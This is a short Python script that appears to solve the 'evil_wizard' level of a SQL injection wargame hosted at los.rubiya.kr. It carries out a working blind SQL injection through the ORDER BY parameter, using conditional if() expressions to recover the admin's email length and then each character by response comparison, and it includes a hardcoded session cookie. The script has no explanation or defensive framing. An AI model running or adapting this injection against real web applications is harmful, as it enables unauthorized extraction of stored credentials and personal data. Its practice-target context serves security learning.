import requests
import string

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?"
cookie = {'PHPSESSID':'1084h0d1455p666p0kkv1e6go7'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "order=if(id='admin' and length(email)={},1,9999)".format(pw_len)
        print(query)
        res = requests.get(url=url+query, cookies=cookie)
        if "50</td></tr><tr><td>rubiya" in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "order=if(id='admin' and ascii(substr(email,{},1))={},1,9999)".format(i,ord(j))
            print(query)
            res = requests.get(url=url+query, cookies=cookie)
            if "50</td></tr><tr><td>rubiya" in res.text:
                print("PASSWORD CHAR : " + j)
                passwd += j
                break
    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
